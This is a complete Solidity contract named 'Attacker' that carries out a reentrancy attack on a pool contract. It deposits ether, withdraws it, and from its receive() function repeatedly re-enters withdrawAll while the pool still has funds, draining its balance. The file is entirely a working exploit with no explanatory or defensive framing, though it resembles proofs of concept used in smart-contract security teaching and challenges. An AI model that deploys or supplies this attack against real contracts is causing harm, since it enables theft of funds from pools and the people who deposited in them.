// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPool {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    IPool public immutable pool;
    uint256 public reentries;

    constructor(address target) {
        pool = IPool(target);
    }

    function attack() external payable {
        pool.deposit{value: msg.value}();
        pool.withdrawAll();
    }

    receive() external payable {
        if (address(pool).balance >= msg.value) {
            reentries++;
            pool.withdrawAll();
        }
    }
}
